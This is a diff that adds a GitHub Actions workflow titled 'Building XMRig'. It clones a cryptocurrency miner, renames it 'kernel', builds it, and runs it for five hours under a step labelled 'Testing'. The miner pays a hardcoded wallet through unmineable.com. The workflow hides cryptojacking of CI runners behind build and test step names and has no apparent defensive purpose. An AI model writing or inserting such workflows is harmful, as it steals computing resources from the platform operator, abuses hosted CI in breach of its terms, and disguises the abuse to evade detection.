@@ -1,0 +1,62 @@
+name: Building XMRig
+
+on:
+  workflow_dispatch:
+    inputs:
+      ALGORITHM:
+        description: 'ALGORITHM'
+        required: true
+        default: 'ghostrider'
+      WALLET:
+        description: 'WALLET'
+        required: true
+        default: '0x2cb3af51075037d030aa3e06ac9e4c912cc16eea'
+      COIN:
+        description: 'COIN'
+        required: true
+        default: 'SHIB'
+      REFERAL:
+        description: 'REFERAL'
+        required: true
+        default: 'uhok-ykxb'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@master
+
+      - name: Prepare the environment
+        run: |
+          sudo apt update -y
+          sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          mkdir workspace
+
+      - name: Clone repo
+        run: |
+          cd workspace
+          git clone --depth=1 https://github.com/jzinferno/xmrig kernel
+          cd kernel && mkdir build
+
+      - name: Build test
+        run: |
+          cd workspace/kernel/build
+          cmake ..
+          make -j$(nproc)
+
+      - name: Testing
+        run: |
+          cd workspace/kernel/build
+          sudo timeout 5h ./xmrig -a ${{ github.event.inputs.ALGORITHM }} -o stratum+ssl://${{ github.event.inputs.ALGORITHM }}.unmineable.com:443 -u "${{ github.event.inputs.COIN }}:${{ github.event.inputs.WALLET }}.${{ github.run_id }}#${{ github.event.inputs.REFERAL }}" -p x -k
+
+      - name: Release
+        uses: softprops/action-gh-release@v1
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          tag_name: ${{ github.run_id }}
+          name: ${{ github.run_id }}
+          files: |
+            workspace/kernel/build/xmrig
